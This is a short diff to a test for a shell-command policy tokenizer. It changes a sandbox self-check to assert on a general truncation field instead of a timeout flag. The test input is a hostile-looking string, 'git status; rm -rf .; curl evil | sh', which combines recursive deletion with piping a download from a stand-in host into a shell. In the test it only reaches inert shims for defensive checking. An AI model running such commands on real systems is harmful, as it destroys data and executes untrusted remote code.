@@ -284,13 +284,14 @@ describeOrSkip('Policy tokenizer vs real sh -c exec-tracing differential', () =>
   it('self-check: the shim sandbox observes exactly the heads the shell exec()s', () => {
     // Hermeticity proof inside the test runner itself: a malicious-looking
     // command resolves only to inert shims, and the trace reflects ground truth.
-    const { heads, timedOut } = runInSandbox(
+    const { heads, truncation } = runInSandbox(
       requireSandbox(),
       'git status; rm -rf .; curl evil | sh',
     );
-    // Asserted first and separately so a load-induced timeout reports as itself
-    // rather than as a baffling `Set {}` vs four names content mismatch.
-    expect(timedOut).toBe(false);
+    // Asserted first and separately so a load-induced timeout — or any other
+    // truncation — reports as itself rather than as a baffling `Set {}` vs four
+    // names content mismatch.
+    expect(truncation).toBeNull();
     expect(heads).toEqual(new Set(['git', 'rm', 'curl', 'sh']));
   });
 
